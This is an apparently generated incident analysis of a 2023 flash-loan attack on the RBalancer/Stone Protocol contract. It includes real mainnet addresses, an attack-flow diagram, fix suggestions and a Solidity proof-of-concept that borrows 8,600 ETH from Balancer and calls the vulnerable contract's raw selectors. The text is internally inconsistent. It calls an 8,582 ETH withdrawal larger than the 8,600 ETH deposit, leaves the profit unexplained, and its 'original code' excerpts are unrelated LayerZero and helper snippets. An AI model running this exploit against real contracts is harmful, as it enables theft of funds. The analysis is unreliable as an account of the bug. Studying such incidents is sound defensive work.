# RBalancer Flash Loan Attack Incident Analysis

## 1. Overview

| Item | Details |
|------|------|
| Project | RBalancer (Stone Protocol) |
| Date | 2023-11-22 |
| Chain | Ethereum Mainnet |
| Loss | ~17 ETH |
| Attack Type | Flash Loan + Custom Function Selector Calls |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0x9abe851bcc4fd1986c3d1ef8978fad86a26a0c57` |
| Attack Contract | `0x9c52c485edd3d22847a1614b8988fbf520b33047` |
| Vulnerable Contract | `0xA62F9C5af106FeEE069F38dE51098D9d81B90572` |
| Fork Block | 18,523,440 |

## 2. Vulnerability Code Analysis

The RBalancer (Stone Protocol) contract borrowed a large amount of ETH via a Balancer V2 flash loan, then manipulated internal state through custom function selectors (`0xd0e30db0`, `0x5069fb57`, `0xb18f2e91`) to illicitly acquire Stone tokens. Selector `0xd0e30db0` was called with a large ETH value to establish a position, `0x5069fb57` transitioned the intermediate state, and `0xb18f2e91` executed a large-scale withdrawal.

```solidity
// Vulnerable pattern: custom functions with no access control
contract StoneProtocol {
    // 0xd0e30db0: deposit-like function — called with ETH
    // internal balance can be manipulated without access control
    fallback() external payable {
        bytes4 sel = bytes4(msg.data);
        if (sel == 0xd0e30db0) {
            _handleDeposit();
        } else if (sel == 0x5069fb57) {
            _handleStateChange(); // no access control
        } else if (sel == 0xb18f2e91) {
            _handleWithdraw(/*params*/); // allows large-scale withdrawal
        }
    }
}
```

**Vulnerability**: The functions invoked via custom selectors allowed large-scale ETH withdrawals following large-scale deposits, without proper access control or state validation. The attacker deposited 8,600 ETH via flash loan, acquired Stone tokens, then manipulated internal state through two additional calls to recover over 8,582 ETH.

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: ExcessivelySafeCall.sol
     * @notice Swaps function selectors in encoded contract calls  // ❌

// ...

     * for the new selector. This function modifies memory in place, and should  // ❌

// ...

    function swapSelector(bytes4 _newSelector, bytes memory _buf)  // ❌
```

```solidity
// File: TransferHelper.sol
    function safeTransferFrom(

// ...

    function safeTransfer(

// ...

    function safeApprove(
```

```solidity
// File: NonblockingLzApp.sol
    function _blockingLzReceive(uint16 _srcChainId, bytes memory _srcAddress, uint64 _nonce, bytes memory _payload) internal virtual override {
        (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft(), 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));  // ❌
        // try-catch all errors/exceptions
        if (!success) {
            _storeFailedMessage(_srcChainId, _srcAddress, _nonce, _payload, reason);
        }
    }
```

## 3. Attack Flow

```
Attacker [0x9abe851bcc4fd1986c3d1ef8978fad86a26a0c57]
  │
  ├─1─▶ Balancer.flashLoan(WETH, 8,600 ETH)
  │      [Balancer Vault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8]
  │      receiveFlashLoan callback triggered
  │
  ├─2─▶ address(VulnContract).call{value: 8600 ether}(
  │          abi.encodeWithSelector(bytes4(0xd0e30db0))
  │      )
  │      [VulnContract: 0xA62F9C5af106FeEE069F38dE51098D9d81B90572]
  │      Deposit 8,600 ETH + establish internal position
  │
  ├─3─▶ Stone.approve(VulnContract, max)
  │
  ├─4─▶ address(VulnContract).call(
  │          abi.encodeWithSelector(bytes4(0x5069fb57))
  │      )
  │      Internal state transition (no access control)
  │
  ├─5─▶ address(VulnContract).call(
  │          abi.encodeWithSelector(
  │              bytes4(0xb18f2e91),
  │              0,
  │              8_582_162_020_025_013_545_654  ← large withdrawal parameter
  │          )
  │      )
  │      Withdraw 8,582+ ETH (exceeds deposited amount)
  │
  ├─6─▶ Convert to WETH and repay Balancer
  │
  └─7─▶ Realize ~17 ETH profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract RBalancerExploit {
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address VulnContract = 0xA62F9C5af106FeEE069F38dE51098D9d81B90572;
    IERC20 Stone = IERC20(/*stone token address*/);
    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testExploit() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 8_600 ether;
        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        WETH.withdraw(amounts[0]);

        // Selector 0xd0e30db0: deposit 8600 ETH
        (bool s1,) = address(VulnContract).call{value: 8_600 ether}(
            abi.encodeWithSelector(bytes4(0xd0e30db0))
        );
        require(s1);

        // Stone approve
        Stone.approve(address(VulnContract), type(uint256).max);

        // Selector 0x5069fb57: state transition
        (bool s2,) = address(VulnContract).call(
            abi.encodeWithSelector(bytes4(0x5069fb57))
        );
        require(s2);

        // Selector 0xb18f2e91: large-scale withdrawal
        (bool s3,) = address(VulnContract).call(
            abi.encodeWithSelector(bytes4(0xb18f2e91), 0, 8_582_162_020_025_013_545_654)
        );
        require(s3);

        WETH.deposit{value: address(this).balance}();
        WETH.transfer(address(balancer), amounts[0] + feeAmounts[0]);
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification

| Item | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | No access control on custom selector functions, unrestricted calls to state transition functions |
| Impact Scope | Stone Protocol ETH holdings |
| Explorer | [Etherscan](https://etherscan.io/address/0xA62F9C5af106FeEE069F38dE51098D9d81B90572) |

## 6. Security Recommendations

```solidity
// Fix 1: Add access control to all state-changing functions
mapping(address => bool) public authorizedUsers;

modifier onlyAuthorized() {
    require(authorizedUsers[msg.sender] || msg.sender == owner, "Unauthorized");
    _;
}

// Fix 2: Validate deposit records on withdrawal
mapping(address => uint256) public depositedAmount;

function deposit() external payable {
    depositedAmount[msg.sender] += msg.value;
}

function withdraw(uint256 amount) external {
    require(amount <= depositedAmount[msg.sender], "Exceeds deposited amount");
    depositedAmount[msg.sender] -= amount;
    payable(msg.sender).transfer(amount);
}

// Fix 3: Block deposit and withdrawal within the same transaction
mapping(address => uint256) public lastDepositBlock;

function withdraw(uint256 amount) external {
    require(block.number > lastDepositBlock[msg.sender],
            "Cannot withdraw in deposit block");
    // ...
}
```

## 7. Lessons Learned

1. **Exposure of Custom Function Selectors**: Even when custom selectors are only identifiable from bytecode, attackers can reverse-engineer and call them directly. All public functions require access control.
2. **Security of State Transition Functions**: Functions that alter internal state (e.g., deposit state → withdrawal state) can be arbitrarily triggered by an attacker without strict condition validation.
3. **Low-Margin 17 ETH Profit**: Earning 17 ETH from an 8,600 ETH flash loan represents an extremely thin margin. A larger capital base or repeated attacks could have inflicted significantly greater damage.
4. **Zero-Fee Balancer Flash Loans**: Balancer flash loans carry no fees, making them viable even for small-margin attacks. Ethereum protocol designs must account for Balancer flash loans in their security model.